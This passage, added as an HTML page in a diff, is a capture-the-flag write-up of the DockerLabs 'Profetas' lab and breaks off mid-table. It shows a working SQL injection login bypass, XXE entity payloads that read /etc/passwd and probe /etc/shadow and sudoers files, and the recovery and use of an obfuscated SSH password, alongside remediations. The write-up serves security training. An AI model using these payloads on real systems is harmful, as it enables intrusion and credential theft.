@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 209 Profetas &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Profetas</p><h1 id="profetas--dockerlabs-id-209-medio">PROFETAS — DockerLabs (id 209, Medio)</h1>
+<p><strong>Ninth DockerLabs engagement.</strong> Solved end to end. Four hops, all four advertised vectors real.</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Image</td>
+<td><code>profetas:latest</code> (Ubuntu 24.04.3, kernel 6.12.38)</td>
+</tr>
+<tr>
+<td>Surface</td>
+<td><code>22/tcp</code> OpenSSH 9.6p1, <code>80/tcp</code> Apache 2.4.58, PHP 8.3.6, MariaDB</td>
+</tr>
+<tr>
+<td>Accounts</td>
+<td><code>jeremias</code> (1001), <code>ezequiel</code> (1002), <code>ubuntu</code> (1000), <code>root</code></td>
+</tr>
+<tr>
+<td>Rewards</td>
+<td><code>DL{flag_user-8F3A7C9B12}</code> (jeremias), <code>fl4sk1pwd</code> (root password), <code>DL{flag_root-C6A4F19D03}</code> (root)</td>
+</tr>
+</tbody>
+</table>
+<p>The catalog advertised <em>&quot;SQLi, XXE, Desofuscación Python, Sudoers croc&quot;</em>. <strong>All four were real</strong>, which makes this the
+first lab in nine where the description was not misleading. It is still misleading in a smaller way: the application
+it presents on port 80 is a fake login followed by a decorative monitoring dashboard, and <strong>neither has anything to do
+with the four advertised vectors</strong>. The real entry point is a file called <code>externalentitiinjection.php</code>.</p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<pre><code>$ docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' profetas_container
+[net-0-11]
+
+$ nmap -sV -Pn -p- [net-0-11]
+Nmap scan report for [net-0-11]
+Host is up (0.000045s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>Two TCP ports, nothing else. No database port, no management plane. The whole chain is
+<strong>web → SSH → one sudoers rule</strong>, and every credential in it is either in the application source or on the
+filesystem. <code>nmap -sU</code> was not attempted: it needs root and is unavailable on this host, so <strong>UDP coverage is a
+declared gap, not a closed port</strong> (per <code>decision-making.md</code>, &quot;a scanner's blind spot is not an absence of service&quot;).
+The image's <code>EXPOSE</code> and the absence of any UDP listener in the service manifests are corroboration, not proof.</p>
+<h3 id="source-read-before-testing-7">Source read before testing (§7)</h3>
+<p>Per <code>decision-making.md</code> §7 the source was read whole before any payload was sent. The webroot is seven PHP files
+and the read paid for itself immediately — it is where the SQLi, the XXE, the credential hint and the dead end are
+all visible without a single probe.</p>
+<pre><code>/var/www/html/
+  admin.php                    5174   the SQLi login
+  config.php                    135   mysqli(&quot;localhost&quot;,&quot;ctf&quot;,&quot;ctf&quot;,&quot;ctfdb&quot;)
+  dashboard.php                 647   session gate on 'auth'
+  externalentitiinjection.php 20975   the XXE parser
+  index.php                    4104   the fake login + the hidden base64 hint
+  logout.php                     79
+  upload.php                   1619   a decoy 500 page, no PHP at all
+  test.txt                       13   &quot;test_content&quot;  &lt;- the lab's own XXE oracle
+  logs/xxe_attempts.log           0
+  uploads/                     (empty)
+</code></pre>
+<p><code>upload.php</code> is worth one line because it is a trap: it is a static HTML page that <em>claims</em> to be a 500 error from
+<code>Apache/2.4.54 (Debian)</code> and carries <code>&lt;!-- notadmin --&gt;</code>. The host runs <code>Apache/2.4.58 (Ubuntu)</code>. A scanner or a
+reader chasing the wrong fingerprint would report a Debian host and a broken upload endpoint. <strong>Discarded with
+reason:</strong> no upload primitive exists in this application.</p>
+<hr />
+<h2 id="2-findings">2. Findings</h2>
+<h3 id="f1--sql-injection-the-filters-cover-the-wrong-parameter-cwe-89">F1 — SQL injection: the filters cover the wrong parameter (CWE-89)</h3>
+<p><code>admin.php:14-51</code>. The handler assembles:</p>
+<pre><code class="language-php">$sql = &quot;SELECT * FROM users WHERE username = '$final_user' AND password = '$pass'&quot;;
+</code></pre>
+<p>Four filters are applied, and <strong>every one of them is applied to the username only</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Filter</th>
+<th>Line</th>
+<th>Applies to</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>strip <code>&quot;</code> <code>;</code> <code>\</code> <code>`</code></td>
+<td><code>:28</code></td>
+<td><code>$processed_user</code></td>
+</tr>
+<tr>
+<td>blacklist <code>OR</code> <code>AND</code> <code>UNION</code> <code>SELECT</code> … <code>--</code> <code>/*</code> <code>*/</code> <code>#</code></td>
+<td><code>:31-37</code></td>
+<td><code>$processed_user</code></td>
+</tr>
+<tr>
+<td>lowercase + strip spaces</td>
+<td><code>:40</code></td>
+<td><code>$processed_user</code></td>
+</tr>
+<tr>
+<td><code>=</code> → <code>!=</code> on <code>\d+=\d+</code></td>
+<td><code>:43-45</code></td>
+<td><code>$processed_user</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>$pass</code> is read at <code>:16</code> and interpolated at <code>:51</code> with <strong>no transformation of any kind</strong>. The screen full of
+defences is on one column of a two-column statement.</p>
+<p>Evidence:</p>
+<pre><code># control: wrong password on a valid-shaped user
+POST username=notadmin&amp;password=wrongpass   -&gt;  ⚠️ Credenciales incorrectas
+
+# control: username that fails the prefix check
+POST username=admin&amp;password=x               -&gt;  Pista: usaurio 'notadmin'
+
+# attack: password field, untouched by all four filters
+POST username=notadmin&amp;password=' OR 1=1-- -
+HTTP/1.1 302 Found
+Location: dashboard.php
+</code></pre>
+<p>The 302 is not a 200-with-a-token: <code>admin.php:58-61</code> sets <code>$_SESSION['auth'] = true</code> and redirects only when
+<code>$res-&gt;num_rows &gt; 0</code>. A 302 <em>is</em> the authentication oracle.</p>
+<p><strong>Impact:</strong> authentication bypass to the application's authenticated tier.</p>
+<p><strong>Root cause:</strong> per-value validation instead of per-statement. The remediation is not a fifth filter on
+<code>$pass</code>; it is parameterised queries (<code>mysqli_prepare</code> / bound parameters) so that no column is trusted because of
+where it sits.</p>
+<h3 id="f2--xxe-libxml_noent-with-the-dtd-loader-enabled-cwe-611">F2 — XXE: <code>LIBXML_NOENT</code> with the DTD loader enabled (CWE-611)</h3>
+<p><code>externalentitiinjection.php:20-49</code>:</p>
+<pre><code class="language-php">$old_entity_loader = libxml_disable_entity_loader(false);
+libxml_use_internal_errors(true);
+$xml = simplexml_load_string($xml_string, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
+</code></pre>
+<p>Three separate misconfigurations compose into arbitrary file read:</p>
+<ol>
+<li><code>LIBXML_NOENT</code> — substitute entities, i.e. expand them into the document.</li>
+<li><code>LIBXML_DTDLOAD</code> — load the external subset.</li>
+<li><code>libxml_disable_entity_loader(false)</code> — a <strong>PHP 8.0 no-op</strong>. The function is deprecated and does nothing; it is
+the most reassuring line in the file and protects nothing. See F6.</li>
+</ol>
+<p>Impact: arbitrary file read as <code>www-data</code>, plus SSRF (external DTD over <code>http://</code>).</p>
+<p><strong>Remediation:</strong> drop <code>LIBXML_NOENT</code> and <code>LIBXML_DTDLOAD</code>; if a DTD is genuinely required, use
+<code>XMLReader</code> with entity resolution disabled and an <code>XMLParserHandler</code> that refuses external entities; and for
+PHP ≥ 8.0 delete the <code>libxml_disable_entity_loader</code> call, because it signals a control that is not there.</p>
+<h3 id="f3--the-application-swallows-the-only-diagnostic-that-would-explain-its-own-failures-cwe-209">F3 — The application swallows the only diagnostic that would explain its own failures (CWE-209)</h3>
+<p>This is the finding the lab is actually about, and it is a <em>different class</em> from the XXE.</p>
+<p><code>parseXMLData()</code> reads <code>libxml_get_errors()</code> <strong>only inside the <code>if ($xml === false)</code> branch</strong> (<code>:33-38</code>). On the
+success path the error list is discarded. Combined with <code>libxml_use_internal_errors(true)</code>, a failed external
+entity fetch does not raise — it <strong>degrades to an empty string</strong>, and the handler renders an empty cell.</p>
+<p>The consequence, measured (see §4 for the method):</p>
+<table>
+<thead>
+<tr>
+<th>probe</th>
+<th>result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>file:///var/www/html/test.txt</code> (0644, 13 B)</td>
+<td><code>VALUE len=13 'test_content\n'</code></td>
+</tr>
+<tr>
+<td><code>file:///dev/null</code> (readable, always empty)</td>
+<td><code>NO-OUTPUT</code></td>
+</tr>
+<tr>
+<td><code>file:///var/www/html/does_not_exist</code></td>
+<td><code>NO-OUTPUT</code></td>
+</tr>
+<tr>
+<td><code>file://[lab-home]/jeremias/ezequiel.pyc</code> (exists, 0644, dir 0750)</td>
+<td><code>NO-OUTPUT</code></td>
+</tr>
+<tr>
+<td><code>file:///root/</code> (a directory)</td>
+<td><code>NO-OUTPUT</code></td>
+</tr>
+<tr>
+<td><code>file:///etc/shadow</code> (exists, 0640)</td>
+<td><code>NO-OUTPUT</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Six conditions, one bit.</strong> &quot;The file read returned nothing&quot; is not a finding; it is the union of <em>empty file</em>,
+<em>no such file</em>, <em>permission denied</em>, <em>is a directory</em> and <em>I/O error</em>. An auditor who reports the first one as
+&quot;XXE confirmed but the target file is empty or missing&quot; will be wrong four times out of five.</p>
+<p>The app <em>had</em> the information. libxml records <code>Failed to load external entity</code> with an errno for every one of these;
+the handler read the list and then threw it away.</p>
+<p><strong>Remediation:</strong> when a fetch fails, surface the libxml error code; and treat an entity that expanded to the empty
+string as an error rather than as a value.</p>
+<h3 id="f4--authentication-state-key-mismatch-the-shipped-login-is-a-dead-end-cwe-287--cwe-306">F4 — Authentication state key mismatch: the shipped login is a dead end (CWE-287 / CWE-306)</h3>
+<p><code>index.php:12</code> sets <code>$_SESSION['logged'] = true</code> on any POST, with no credential check at all. Every consumer of
+that state checks a <strong>different key</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>file</th>
+<th>line</th>
+<th>checks</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>dashboard.php</code></td>
+<td><code>:3</code></td>
+<td><code>!isset($_SESSION['auth'])</code></td>
+</tr>
+<tr>
+<td><code>externalentitiinjection.php</code></td>
+<td><code>:5</code></td>
+<td><code>!isset($_SESSION['auth']) || $_SESSION['auth'] !== true</code></td>
+</tr>
+</tbody>
+</table>
+<p>Measured:</p>
+<pre><code>POST /index.php (any user/pass)          -&gt; 302
+GET  /dashboard.php  with that session   -&gt; 302 -&gt; /index.php
+GET  /externalentitiinjection.php        -&gt; 302 -&gt; /index.php
+</code></pre>
+<p>So the elaborate &quot;ProfetaNet — Monitorización de Servidores&quot; panel with its sixteen prophets, its random status
+colours and its Luke 8:17 epigraph is <strong>unreachable through its own login form</strong>, and leads nowhere even if reached.
+The only way in is the SQLi, which sets <code>auth</code> directly.</p>
+<p>This is reported as a finding rather than a footnote because the fake login is the target's front page and it
+<em>looks</em> like the intended entry point. Two consequences: an auditor who stops at the login form concludes the
+application is unauthenticated-but-harmless; and the <em>real</em> authentication tier has no legitimate front door, so
+every visitor must use the injection. <strong>Remediation:</strong> one session key, and a login form that actually
+authenticates.</p>
+<h3 id="f5--a-credential-that-cannot-authenticate-through-its-own-login-form-cwe-521">F5 — A credential that cannot authenticate through its own login form (CWE-521)</h3>
+<p>The <code>users</code> table has exactly one row (recovered by boolean-blind extraction, and independently corroborated by
+root's <code>.mysql_history</code>, §7):</p>
+<pre><code>INSERT INTO users VALUES (1,'notadmin','SuperSecurePass');
+</code></pre>
+<p><code>admin.php:48</code> builds <code>$final_user = &quot;realadmin&quot; . $processed_user</code>, so the statement always queries
+<code>username = 'realadmin...'</code>. <strong>No input can match the only account that exists.</strong> The correct credential is
+unreachable, which means the application has no working login and cannot be audited by its intended route.</p>
+<p>Root cause is a renamed account, not a missing check — which is why a reviewer reading only the filters would not
+see it. <strong>Remediation:</strong> the prefix rewrite has no defensible purpose; remove it.</p>
+<h3 id="f6--hardcoded-database-credentials-in-the-document-root-cwe-798">F6 — Hardcoded database credentials in the document root (CWE-798)</h3>
+<p><code>config.php</code>:</p>
+<pre><code class="language-php">$conn = new mysqli(&quot;localhost&quot;, &quot;ctf&quot;, &quot;ctf&quot;, &quot;ctfdb&quot;);
+</code></pre>
+<p><code>ctf/ctf</code>, world-readable, inside the document root, with <code>ALL PRIVILEGES ON ctfdb.*</code> (per root's
+<code>.mysql_history</code>). Not load-bearing in this chain — the SQLi did not need it — but it is a real disclosure and it
+is one request from anonymous. <strong>Remediation:</strong> move credentials out of the docroot and out of source control;
+grant the application only the specific statements it issues.</p>
+<h3 id="f7--libxml_disable_entity_loaderfalse-is-a-no-op-on-php-8-cwe-1164--misleading-control">F7 — <code>libxml_disable_entity_loader(false)</code> is a no-op on PHP 8 (CWE-1164 / misleading control)</h3>
+<p><code>:23</code> and <code>:46</code>. Deprecated in PHP 8.0 and non-functional; since libxml 2.9 external entity loading is already off
+by default and only <code>LIBXML_NOENT | LIBXML_DTDLOAD</code> re-enables it. A reviewer skimming for &quot;entity loader disabled?&quot;
+finds the line and concludes the parser is hardened. <strong>It is the single most dangerous line in the file</strong>, because
+it is the one that looks like the control. This is <code>decision-making.md</code> §7 landing in a function call: a reassuring
+name, no behaviour.</p>
+<h3 id="f8--session-fixation-surface-on-the-fake-login-cwe-384-minor">F8 — Session fixation surface on the fake login (CWE-384, minor)</h3>
+<p><code>index.php:2</code> calls <code>session_start()</code> and <code>:12</code> promotes the session with no <code>session_regenerate_id()</code>. Not
+load-bearing (the injection sets <code>auth</code> on whatever session it is given), reported for completeness.</p>
+<hr />
+<h2 id="3-deobfuscation-homejeremiasezequielpyc">3. Deobfuscation: <code>[lab-home]/jeremias/ezequiel.pyc</code></h2>
+<p>Reached as <code>jeremias</code>. This was half the lab, not a formality.</p>
+<pre><code>-rw-r--r-- 1 jeremias jeremias 7682 Jan 16  2026 ezequiel.pyc
+md5 1e932453bfb5dbe2dab6683002bad737
+</code></pre>
+<h3 id="31-establishing-provenance-before-reading-anything">3.1 Establishing provenance before reading anything</h3>
+<p>Fetched over SFTP with the remote md5 carried across and recomputed locally, because an earlier attempt to move the
+file with <code>base64 -w0</code> over a command channel silently truncated it to 6144 of 7682 bytes and the md5 caught it:</p>
+<pre><code>remote [lab-home]/jeremias/ezequiel.pyc = 1e932453bfb5dbe2dab6683002bad737
+local  ezequiel.pyc              = 1e932453bfb5dbe2dab6683002bad737  (7682 bytes)
+MATCH
+</code></pre>
+<p><strong>A truncated artifact is still a valid-looking artifact.</strong> A <code>.pyc</code> missing its last 1.5 KB still unmarshals.</p>
+<h3 id="32-interpreter-version--the-first-trap">3.2 Interpreter version — the first trap</h3>
+<pre><code>pyc magic     f30d0d0a   -&gt; CPython 3.13
+host python3  2b0e0d0a   -&gt; CPython 3.12.3
+source name   conceded.py
+</code></pre>
+<p><code>marshal.loads()</code> on 3.12 <strong>succeeded</strong> and returned a code object with entirely plausible <code>co_names</code> and
+<code>co_consts</code> — the function names, the string literals <code>'234r3fsd2'</code> and <code>'-34fsdrr32'</code>, the tuple <code>(3, 6)</code>. The only
+tell was that <code>dis</code> emitted nonsense: <code>INTRINSIC_1_INVALID</code>, <code>CALL_INTRINSIC_1 (INTRINSIC_IMPORT_STAR)</code>,
+<code>CALL 0</code> followed by an immediate <code>STORE_FAST</code>.</p>
+<p><strong>A cross-version unmarshal that does not crash is not a validated parse.</strong> A 3.13 code object has fields 3.12 does
+not, so the constants you are about to reason from may not be the constants the author wrote. Getting a real 3.13
+interpreter (<code>uv python install 3.13</code>, magic confirmed <code>f30d0d0a</code> before use) took two minutes and made every later
+conclusion sound.</p>
+<h3 id="33-what-the-transform-actually-is">3.3 What the transform actually is</h3>
+<p>Five functions, three of which are the encoding, and <strong>no key anywhere</strong>:</p>
+<pre><code class="language-python">_p1 = '234r3fsd2'
+_p2 = '-34fsdrr32'
+
+def _e1(d):                                  # base64( rot13( base64(x) ) )
+    a  = base64.b64encode(d.encode()).decode()
+    b1 = codecs.encode(a, 'rot_13')
+    return base64.b64encode(b1.encode()).decode()
+
+def _e2(d):                                  # base32( reverse( hex(x) ) )
+    hx = d.encode().hex()[::-1]
+    return base64.b32encode(hx.encode()).decode()
+
+def _e3(d):                                  # reverse( base85( zlib(x) ) )
+    return base64.b85encode(zlib.compress(d.encode())).decode()[::-1]
+
+_O = [_e1(_p1), _e2(_p2), _e3(_p1 + _p2)]
+</code></pre>
+<pre><code>_O[0] = WndaMHB3QXpwMkRs
+_O[1] = GIZTGMZSG4ZDONBWGM3TMNRUGMZTGZBS
+_O[2] = N$Mm^50&amp;IcMMKfu8He-4^DrYqYHbm_$c
+</code></pre>
+<p><strong>There is no passphrase, no salt, no KDF, and no key.</strong> The <code>_O</code> table was built by calling the encoders on two
+plaintext string literals that are sitting in the same file. This is the same entry criterion as the binary-reversing
+oracle in <code>infrastructure.md</code> — look for the KDF, find its absence, and the recovery is arithmetic — applied to
+bytecode instead of an import table. <code>_O[2]</code> encodes the <em>concatenation</em> of the other two plaintexts and
+<strong>is never read by anything</strong>.</p>
+<h3 id="34-the-decoy-and-the-one-real-anti-analysis-measure">3.4 The decoy, and the one real anti-analysis measure</h3>
+<p><code>class X</code> is an LCG keystream XOR cipher, and it is <strong>never referenced anywhere in the module</strong>:</p>
+<pre><code class="language-python">class X:
+    def __init__(s): s._a = 3735928559                    # 0xDEADBEEF
+    def _r(s, n):
+        x = s._a
+        for _ in range(n):
+            x = (x * 25214903917 + 11) &amp; 281474976710655  # LCG, modulus 2^48
+        return x
+    def f(s, d):                                          # XOR keystream
+        t = bytearray()
+        for i, ch in enumerate(d.encode() if isinstance(d, str) else d):
+            t.append(ch ^ (s._r(i) &amp; 255))
+        return bytes(t)
+</code></pre>
+<p>A reverser who reads the file top-down, sees a stream cipher with a hardcoded seed, and spends the engagement
+attacking it never notices that the credential is three layers of base64/rot13/base32 away from two string
+literals. This is <code>decision-making.md</code> §7 with a cipher on it: <strong>the impressive object is the decoy, and intent is
+not reachability.</strong></p>
+<p>The one genuine anti-analysis measure is <code>random.seed(4919)</code> (<code>:86</code>) — a <strong>fixed PRNG seed</strong>. It makes <code>_o1()</code> and
+<code>_o2()</code> (50-element float sums, 5×5 random matrices, both results discarded) fully deterministic, which is what
+makes the sample reproducible. It is also a security finding in its own right: a fixed seed is not entropy.</p>
+<h3 id="35-verification--three-independent-oracles">3.5 Verification — three independent oracles</h3>
+<p><strong>(a) Re-derive every layer from first principles</strong>, without calling the sample's own helpers:</p>
+<pre><code>_e1('234r3fsd2')  -&gt; base64(rot13(base64(s)))  == _O[0]   OK
+_e2('-34fsdrr32')  -&gt; base32(hex(s)[::-1])      == _O[1]   OK
+_e3(s)             -&gt; reverse(base85(zlib(s))) == _O[2]   OK
+</code></pre>
+<p><strong>(b) Recompile the reconstruction and diff code-object signatures</strong> against the original — recursively, over
+<code>co_name</code>, <code>co_argcount</code>, <code>co_names</code> and every non-code constant. This validates <em>my reading</em>, not the result:</p>
+<pre><code>IDENTICAL: every nested function, argcount, name and constant matches
+</code></pre>
+<p>The only residual is <code>__firstlineno__</code> (<code>X</code> 9 vs 4, <code>V</code> 64 vs 46) — source layout, not semantics, and reported as
+such rather than papered over.</p>
+<p><strong>(c) Adjudicate with the sample's own comparison loop</strong> (<code>V.v</code>, a non-early-exit bytewise accumulator):</p>
+<pre><code>v(obj, '234r3fsd2-34fsdrr32'   ) -&gt; True
+v(obj, 'jeremias'              ) -&gt; 0
+v(obj, 'ezequiel'              ) -&gt; 0
+v(obj, '234r3fsd2-34fsdrr3'    ) -&gt; 0
+v(obj, '234r3fsd2-34fsdrr32x'  ) -&gt; 0
+v(obj, '234r3fsd2'             ) -&gt; 0
+</code></pre>
+<p><strong>Secret: <code>234r3fsd2-34fsdrr32</code></strong> — and the account's own success banner prints the masked shape
+<code>Password: 2...-3..</code>, whose leading <code>2</code> and <code>-3</code> agree with the recovered string at offsets 0 and 9. Reported as
+<strong>partial</strong> corroboration only: the banner is 8 glyphs wide and the secret is 19 characters, so the mask widths do
+not correspond to the real length and it cannot confirm the whole value.</p>
+<p>Verified by use, which is the only oracle that counts:</p>
+<pre><code>$ python3 sshx.py try ezequiel '234r3fsd2-34fsdrr32'
+### ezequiel:... -&gt; OK
+uid=1002(ezequiel) gid=1002(ezequiel) groups=1002(ezequiel),100(users)
+</code></pre>
+<h3 id="36-the-sample-is-broken-three-independent-ways-and-hides-all-three">3.6 The sample is broken three independent ways, and hides all three</h3>
+<p><strong>This is the most valuable thing in the file.</strong> <code>concedido.py</code> cannot reach its own success path, for three
+unrelated reasons, and a bare <code>except:</code> in <code>m()</code> converts all of them into one silent exit.</p>
+<p><strong>Defect 1 — <code>m()</code> calls <code>V()</code> with no argument, but <code>__init__</code> takes one.</strong></p>
+<pre><code class="language-python">def __init__(s):        # co_argcount == 1, co_varnames == ('s',)  -- there is no `self`
+    s._ct = 0
+    s._st = 3405691582
+...
+v = V()                 # TypeError: missing 1 required positional argument
+</code></pre>
+<p>Every method in both classes takes the <strong>instance as its first parameter</strong> — they were written as module-level
+functions and stuffed into class bodies, so <code>def __init__(self, s)</code> should have been <code>def __init__(s)</code>. Note this
+is only visible from the <em>bytecode</em>: <code>co_varnames</code> is <code>('s',)</code>, not <code>('self', 's')</code>.</p>
+<p><strong>Defect 2 — <code>def m()</code> shadows <code>import math as m</code>.</strong> <code>_o1()</code> calls <code>m.sin</code>, <code>m.exp</code>, <code>m.cos</code>, but the module-level
+<code>def m():</code> at line 61 rebinds the name. Result:</p>
+<pre><code>AttributeError: 'function' object has no attribute 'sin'
+</code></pre>
+<p><strong>Defect 3 — <code>V._x</code> inverts the transform in the wrong order.</strong></p>
+<pre><code class="language-python">l1 = b.b64decode(b.b64decode(c.decode(_O[0], 'rot_13')).decode())
+</code></pre>
+<p><code>_e1</code> builds <code>base64(rot13(base64(s)))</code>, so inverting it requires <strong>decode first, then rot13</strong>. The sample applies
+rot13 <em>before</em> the first decode, so the second <code>b64decode</code> is handed 12 raw bytes:</p>
+<pre><code>rot13(_O[0])     = 'JaqnZUO3DKcjZxEf'
+b64decode(that)  = b'%\xaa\xa7eC\xb7\x0c\xa7#g\x11\x1f'   &lt;- raw bytes, no longer base64 text
+b64decode(that)  = Error: Incorrect padding
+</code></pre>
+<p><strong>Empirical proof, not inference.</strong> The shipped <code>.pyc</code> was executed under a pty and fed the correct password:</p>
+<pre><code>    ╔═══════════════════════════════════════╗
+    ║    SISTEMA DE AUTENTICACIÓN SEGURA    ║
+    ║         v3.14.159 - INTERNO           ║
+    ╚═══════════════════════════════════════╝
+🔐  Contraseña: 234r3fsd2-34fsdrr32
+---- exit status: 0 ----
+</code></pre>
+<p>It prompts, accepts the correct password, and then prints <strong>neither</strong> <code>ACCESO CONCEDIDO</code> <strong>nor</strong>
+<code>Error: verificación falló</code>. One silent exit, three different crashes, zero diagnostics.</p>
+<p><strong>Why this matters beyond the lab:</strong> the bare <code>except:</code> is the same defect as F3 in a different language. A
+catch-all converts three specific failures into one indistinguishable outcome, and the program's only observable
+behaviour — &quot;it exited&quot; — is compatible with all of them. The lab hands you the secret and then makes the program
+unable to confirm it, so the <em>only</em> honest way to close the loop is to drive the code objects yourself. That is
+why §3.5(c) exists.</p>
+<hr />
+<h2 id="4-xxe-how-a-real-one-was-distinguished-from-a-payload-returned-unprocessed">4. XXE: how a real one was distinguished from a payload returned unprocessed</h2>
+<p>This is the section the methodology has no oracle for, so it is written out in full.</p>
+<h3 id="41-the-control-that-makes-it-decidable">4.1 The control that makes it decidable</h3>
+<p>The lab ships <code>/var/www/html/test.txt</code> containing the string <code>test_content</code>. That file is the oracle, and it is
+placed so that the <em>value</em> is the discriminator, not the status code:</p>
+<pre><code>### T0 CONTROL: plain document, no entity
+sent:     &lt;name&gt;alice&lt;/name&gt; &lt;role&gt;tester&lt;/role&gt;
+returned: name=alice  role=tester
+
+### T1 CONTROL: INTERNAL entity only, no external reference
+sent:     &lt;!ENTITY x &quot;INLINE_MARKER_12345&quot;&gt; ... &lt;name&gt;&amp;x;&lt;/name&gt;
+returned: name=INLINE_MARKER_12345          &lt;- expanded, but nothing was fetched
+
+### T2 ATTACK: EXTERNAL entity, file:///var/www/html/test.txt
+sent:     &lt;!ENTITY x SYSTEM &quot;file:///var/www/html/test.txt&quot;&gt; ... &lt;name&gt;&amp;x;&lt;/name&gt;
+returned: name=test_content
+</code></pre>
+<p><strong><code>test_content</code> is a value that appears in no request I ever sent.</strong> The parser cannot synthesise it, cannot
+echo it, and cannot infer it. This is the whole difference between &quot;my payload came back&quot; and &quot;the target read a
+file&quot;:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>What it proves</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Response contains my entity declaration verbatim</td>
+<td>The parser did not process anything. <strong>Not a finding.</strong></td>
+</tr>
+<tr>
+<td>Response contains my <em>internal</em> entity's value</td>
+<td>Entity substitution is on. Proves <code>LIBXML_NOENT</code>, nothing about reach.</td>
+</tr>
+<tr>
+<td>Response contains a <strong>file's</strong> content</td>
+<td>The parser resolved an <strong>external</strong> reference. That is XXE.</td>
+</tr>
+</tbody>
+</table>
+<p>Three states, and only the third is the vulnerability. The middle one is the trap: a lab that reports
+&quot;T1 succeeded, therefore XXE confirmed&quot; has demonstrated a capability that every XML parser since 2008 has.</p>
+<h3 id="42-the-channel">4.2 The channel</h3>
+<p>The exfiltration channel here is <strong>the HTTP response itself</strong>. <code>LIBXML_NOENT</code> expands the entity into the parsed
+document, the document is <code>json_encode</code>d, and the field is rendered into the result table at <code>:110-135</code>. The signal
+travels back in-band, so <strong>no out-of-band infrastructure is required</strong> — which is worth stating plainly, because
+&quot;if you have no OOB you have no XXE&quot; is only true for blind XXE. In-band reflection is a complete channel, and
+treating it as a weaker case of OOB is a mistake that costs engagements.</p>
+<h3 id="43-vectors-distinguished-and-what-each-one-proves">4.3 Vectors distinguished, and what each one proves</h3>
+<p>Each vector tests a <em>different capability</em> of the parser, which is why testing several is what establishes that the
+control is absent rather than merely misconfigured:</p>
+<table>
+<thead>
+<tr>
+<th>vector</th>
+<th>capability tested</th>
+<th>result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>internal entity</td>
+<td><code>LIBXML_NOENT</code> substitution</td>
+<td>expanded (T1)</td>
+</tr>
+<tr>
+<td><code>file://</code> external entity</td>
+<td>external reference resolution</td>
+<td><strong><code>/etc/passwd</code> read in full, 29 lines</strong></td>
+</tr>
+<tr>
+<td><code>php://filter/convert.base64-encode</code></td>
+<td>stream-wrapper resolution</td>
+<td>resolved (succeeded)</td>
+</tr>
+<tr>
+<td><code>http://</code> in an external DTD subset</td>
+<td>SSRF / network egress</td>
+<td>not exercised end-to-end — see §9</td>
+</tr>
+<tr>
+<td><code>expect://</code></td>
+<td>code execution</td>
+<td>not attempted — see §9</td>
+</tr>
+</tbody>
+</table>
+<p>The <code>file://</code> read of <code>/etc/passwd</code> is the decisive one, and it is worth noting that the lab <em>helps</em> here:
+<code>externalentitiinjection.php:113-116</code> special-cases a value beginning with <code>root:</code> and renders it in a
+<code>file-content</code> div. The author built the confirmation into the page, which is a hint, not evidence — the evidence
+is that the content came from a file I never sent.</p>
+<h3 id="44-a-third-outcome-and-why-it-is-the-dangerous-one">4.4 A third outcome, and why it is the dangerous one</h3>
+<p>A failed external fetch does <strong>not</strong> raise. With <code>libxml_use_internal_errors(true)</code> the parse succeeds with the
+entity expanded to the empty string, and the page renders an empty cell. Measured over eight probes (§2, F3): one
+returned content, <strong>seven returned a byte-identical empty result</strong> spanning an empty file, a missing file, a
+permission-denied file, a directory, and a root-only file.</p>
+<p>The diagnostic runs in the direction the method requires — <em>the failure names the block</em>. But it cannot run
+here, because the application reads the libxml error list and throws it away on the success path. What saved the
+analysis was an <strong>independent channel</strong>: the file modes, checked outside the application.</p>
+<pre><code>/etc/sudoers.d/ezequiel   0644  -&gt; VALUE, content returned
+/etc/sudoers              0640  -&gt; NO-OUTPUT
+</code></pre>
+<p>A world-readable file returned and a root-only file did not, so the empty result is a <strong>permission</strong> signal, not a
+parser failure. That is a conclusion about the <em>filesystem</em>, established from a source the application does not
+control, and it is why the empty cell could be interpreted at all.</p>
+<hr />
+<h2 id="5-chain">5. Chain</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Hop</th>
+<th>Identity after</th>
+<th>Why this step, and not another</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>SQLi in <code>admin.php</code> <strong>password</strong> field → <code>$_SESSION['auth']</code></td>
+<td><code>www-data</code> (via session)</td>
+<td>The four filters are on the username. The <code>notadmin</code> prefix check at <code>:19</code> is the only gate and it is a <em>string</em> test, not an auth decision.</td>
+</tr>
+<tr>
+<td>2</td>
+<td>XXE file read in <code>externalentitiinjection.php</code></td>
+<td><code>www-data</code></td>
+<td><code>/etc/passwd</code> confirmed three accounts and the sudoers hint. The pyc is <strong>not</strong> reachable from here — see §6.</td>
+</tr>
+<tr>
+<td>3</td>
